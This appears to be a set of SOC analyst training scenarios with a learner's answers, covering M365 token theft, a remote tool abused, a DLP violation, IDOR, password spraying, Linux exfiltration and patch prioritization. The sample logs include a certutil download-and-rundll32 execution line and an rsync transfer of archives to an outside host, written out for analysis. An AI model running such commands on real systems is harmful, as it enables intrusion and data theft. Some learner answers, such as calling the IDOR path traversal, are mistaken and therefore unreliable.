title: Realistic Hands-On SOC Scenarios
summary: 7 realistic hands-on CySA+ / SOC analyst scenarios focused on cloud identity compromise, remote management tool abuse, cloud storage/DLP policy violations, API authorization flaws, Active Directory credential abuse, Linux data exfiltration, and vulnerability prioritization under business pressure.

scenarios.title: Microsoft 365 Mailbox Access After Travel

sections.title: Background
items: A finance employee returned from a business trip two days ago.
The employee normally works from Vilnius but recently used hotel Wi-Fi and airport Wi-Fi.

sections.title: Microsoft 365 Sign-in Logs
items: 08:12 UTC — Successful login from Vilnius, Lithuania
08:19 UTC — Successful login from Amsterdam, Netherlands
08:24 UTC — Successful login from Vilnius, Lithuania
MFA result: satisfied by previously registered method
Client app: Browser
Conditional Access: Passed
Device compliance: Unknown
Session ID reused across multiple requests

sections.title: Mailbox Audit
items: SearchQuery initiated: subject:"invoice" OR subject:"payment" OR subject:"wire"
312 messages accessed in 11 minutes
Inbox rule created: Name: "Archive processed"
Rule condition: sender contains "vendor"
Rule action: move to folder "RSS Feeds"
Forwarding is not enabled

sections.title: Defender for Cloud Apps
items: OAuth app consent granted: PDF Invoice Preview
Permissions: Mail.Read, offline_access
Publisher: Unverified
Consent type: User consent

sections.title: Helpdesk Ticket
items: The user says: "I did open a PDF preview page from an invoice email yesterday, but I changed my password this morning."

tasks: What are the most likely explanations for the activity? List at least two possibilities.
Which evidence points toward compromise instead of normal travel?
Why might the password change not stop the suspicious access?
What should be revoked or disabled first?
Which logs would you review next to confirm mailbox impact?
What would you tell the user or helpdesk to avoid destroying evidence?
Suggest one detection rule idea for this scenario.

myAnswers.answer: I see only token hijack with unauthorized account access, i would have said maybe normal activity but it looks very suspicious, not normal
Impossible travel, accessing a lot of messages in small amount of time, pdf page opened from invoice email
Because password change doesn't affect token compromise
Account should be locked or revoked from privileges, and there should be further investigation, particularly on possible token hijack
IP address during suspicious login, Defender for cloud apps logs.
Deleting account or removing any evidence like login logs
IF impossible travel login attempt in short amount of time AND suspicious activity (accessing a lot of messages, creating new rules) THEN revoke privileges and lock the account + extract logs

scenarios.title: EDR Alert or IT Admin Tool Misuse

sections.title: Background
items: A software deployment team uses remote management tools to update workstations after hours.
One endpoint, WS-117, triggered several EDR alerts during the same maintenance window.

sections.title: EDR Process Tree
items: C:\Program Files\RemoteAssist\ra_service.exe
Child process: C:\Windows\System32\cmd.exe /c whoami
Child process: powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\update_check.ps1
certutil.exe -urlcache -split -f http://185.199.108.90/win.dat C:\ProgramData\win.dat
rundll32.exe C:\ProgramData\win.dat,Start

sections.title: File Details
items: win.dat has no vendor signature
Hash is unknown in VirusTotal
File was created only on WS-117
RemoteAssist binary is signed and used in the company

sections.title: Network
items: Then connected to 45.83.12.44:443 every 90 seconds
No proxy category reputation available for 45.83.12.44

sections.title: Admin Chat
items: A deployment engineer says: "We did push updates last night, but I don't recognize win.dat or that IP."

tasks: What is the most likely security concern?
What evidence could still be legitimate admin activity?
What evidence makes it suspicious despite the signed remote tool?
What should be contained first: the host, the remote tool, the admin account, or the IP? Explain.

myAnswers.answer: Possible machine compromise and persistence established, powershell command execution
update_check.ps1, recent updates done, RemoteAssist binary is signed
Powershell command execution bypassing policy, connection to external ip and timed connection to other external ip, indicating possible C2
The host, because tool was just a way to gain foothold in machine, containing admin account wouldn't do much, so the best decision is to contain and isolate the host, collect logs and investigate.

scenarios.title: Cloud Storage Data Access Without Malware

sections.title: Background
items: A product manager has access to customer research documents.
DLP alerts triggered after unusual cloud storage activity.

sections.title: CASB / Cloud Logs
items: User: lina.p@company.example
Source IP: normal corporate VPN range
Device: personal laptop, not managed by MDM
Downloaded 4.8GB from SharePoint folder: /ProductStrategy/2027-Roadmap/
Uploaded 4.6GB to: https://drive-storage-personal.example/upload
Activity started at 22:41 local time
User authenticated successfully with MFA

sections.title: HR Context
items: User is moving to another internal team in two weeks
No resignation submitted
Manager says the user is preparing a handover
The destination cloud service is not approved for company data

sections.title: Endpoint Context
items: No EDR agent installed because device is personal/BYOD
No malware indicators available
User claims: "I needed the files at home because SharePoint was slow."

tasks: What are the main possible explanations?
Why is this not automatically proof of malicious insider theft?
Why is it still a security incident or policy violation?
What should analysts verify before disabling the account?

myAnswers.answer: Legitimate activity however violating company's policy because destination cloud service was not approved for company data
Because there is no real indicators of malicious activity like impossible travel, multiple failed logins, unusual behavior
Because user was not allowed to store company data in un-approved service
Verify if there was no other data accessed

scenarios.title: API Authorization Abuse / IDOR

sections.title: Background
items: A customer support portal uses an API endpoint to retrieve ticket attachments.
The WAF has no SQL injection alerts, but customers report seeing files that do not belong to them.

sections.title: Web/API Logs
items: 10.4.8.22 user_id=884 GET /api/tickets/88421/attachment/1 HTTP 200
10.4.8.22 user_id=884 GET /api/tickets/88422/attachment/1 HTTP 403
10.4.8.22 user_id=884 GET /api/tickets/88423/attachment/1 HTTP 200
10.4.8.22 user_id=884 GET /api/tickets/88424/attachment/1 HTTP 200
10.4.8.22 user_id=884 GET /api/tickets/88425/attachment/1 HTTP 403

sections.title: Application Notes
items: Ticket IDs are sequential
Authentication is required
Authorization checks are handled by backend logic
No obvious SQL injection, XSS, or command injection payloads
Rate limit did not trigger because requests were slow

sections.title: Customer Report
items: A customer says: "I changed one number in the URL and opened someone else's attachment."

tasks: What vulnerability class is most likely?
Why would a WAF miss this?
What evidence supports authorization abuse rather than injection?
What should be done first to reduce exposure?
Which logs or database fields would help determine impacted customers?

myAnswers.answer: Path traversal, it allows users to access data they weren't allowed to
Because it's not an intrusion or attack, most likely caused due to lack of input sanitization, code flaw
Slow requests, no obvious malicious payloads, authentication is required
Fix the code long-term, or disable feature to access anything for anybody short-term
GET requests and requested data user id

scenarios.title: AD Password Spraying or Broken Service

sections.title: Background
items: A SIEM correlation rule triggered for failed logins across many users.
The source is an internal application server, APP-03.

sections.title: Windows Security Logs
items: 4625 failed logon events against 146 users over 3 hours
Failure reason: bad password
Logon Type: 3
Source: APP-03
Authentication package: NTLM
Attempts occur every 75 seconds
One account, svc_reports, succeeds after several failures
Event ID 4672 occurs for svc_reports on FILE-02
Shortly after, FILE-02 logs access to \\FILE-02\C$

sections.title: Application Team
items: APP-03 runs an old reporting app using stored credentials.
The team says: "The app sometimes fails when the password expires."

sections.title: Additional Context
items: svc_reports should only read reports from SQL-02
svc_reports should not access FILE-02 admin shares
No approved change window occurred

tasks: What are the possible benign and malicious explanations?
Which detail makes this more serious than a broken application password?
What should be investigated first?
What containment action would reduce risk without breaking everything immediately?
Which accounts and hosts should be scoped?

myAnswers.answer: Password spraying or credential stuffing, then priv esc, then root level access. Reporting app most likely resets expired passwords to weak ones or default
Reporting app stores credentials, meaning all users can be affected
The logic behind handling of expired password accounts by app
Disabling app's expired password handling (not sure, maybe disabling login possibility but it would mean more serious downtime, maybe disabling APP-03 for now).
APP-03, accessed accounts after server failures

scenarios.title: Linux Server Exfil or Legitimate Backup

sections.title: Background
items: A Linux web server hosts internal reports.
Network monitoring flagged a large outbound transfer late at night.

sections.title: Linux auth.log
items: Jun 10 01:12:44 web-02 sshd[1833]: Accepted publickey for deploy from 10.0.6.12 port 52218 ssh2
Jun 10 01:14:02 web-02 sudo: deploy : TTY=pts/0 ; PWD=/srv/reports ; USER=root ; COMMAND=/usr/bin/tar -czf /tmp/reports_june.tar.gz /srv/reports
Jun 10 01:18:27 web-02 sudo: deploy : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/rsync -av /tmp/reports_june.tar.gz backup@203.0.113.88:/incoming/

sections.title: Cron
items: /etc/cron.d/nightly-report-sync exists
The cron job normally runs at 03:00, not 01:18
The destination in the cron job is backup@10.0.9.40:/backup/reports/

sections.title: NetFlow
items: src=web-02 dst=203.0.113.88 dst_port=22 bytes_out=2800000000 bytes_in=64000 duration=980

sections.title: Admin Context
items: The deploy user belongs to the web deployment group.
The backup vendor says 203.0.113.88 is not their address.

tasks: What is the most likely concern?
What could make this look like legitimate admin or backup activity?
Which evidence makes it suspicious?
What should be preserved before deleting files or killing sessions?

myAnswers.answer: Most likely data exfil, legitimate activity is very unlikely here because of several suspicious events
This could be legitimate admin or backup activity if it was at a dedicated time and to a dedicated backup address
Unusual time, suspicious backup address
Logs, activity artifacts like commands, data traffic

scenarios.title: Vulnerability Prioritization Under Pressure

sections.title: Background
items: Leadership wants all "critical" vulnerabilities patched immediately.
Operations says some systems cannot be patched this week.

sections.title: Vulnerability A
items: Internet-facing VPN appliance
CVSS: 9.8
Public exploit available
Exploitation observed in the wild
Device provides remote access for employees
Patch available

sections.title: Vulnerability B
items: Internal database server
CVSS: 8.6
Contains sensitive customer data
No public exploit
Requires authenticated network access
Patch requires 4 hours downtime

sections.title: Vulnerability C
items: Public marketing website
CVSS: 9.1
Vulnerable component exposed only on admin panel
Admin panel restricted by IP allowlist
WAF rule available
Patch available next week

sections.title: Vulnerability D
items: Legacy manufacturing workstation
CVSS: 7.5
No patch available
Controls physical process equipment
Network segmented but monitoring is weak
Vendor recommends disabling SMBv1 but app team says it may break production

tasks: Which vulnerability should be prioritized first and why?
Which vulnerability needs compensating controls instead of normal patching?
Which vulnerability may have a lower immediate risk than its CVSS suggests?
What additional business context would you ask for?
What should be done if patching the VPN appliance fails?

myAnswers.answer: I would say either A or D, i think A, because D is exploitable but network is segmented, even if monitoring is weak. While A has an actively exploitable high CVSS rating vulnerability and provides remote access for employees, meaning if exploited it would mean probably lateral movement or priv esc. B contains sensitive info but no exploit available and authenticated access required, C is hard to exploit and doesn't have any sensitive info, at least from the description.
D, because there is no patch available. I would say segmentation is the best decision
C, because it's too hard to exploit and patch available soon
How much sensitive data is stored on B internal db server, is it PI, what kind of security training do employees go through, and how costly is it to replace legacy system
Finding an alternative to current VPN appliance, maybe other VPN service or platform
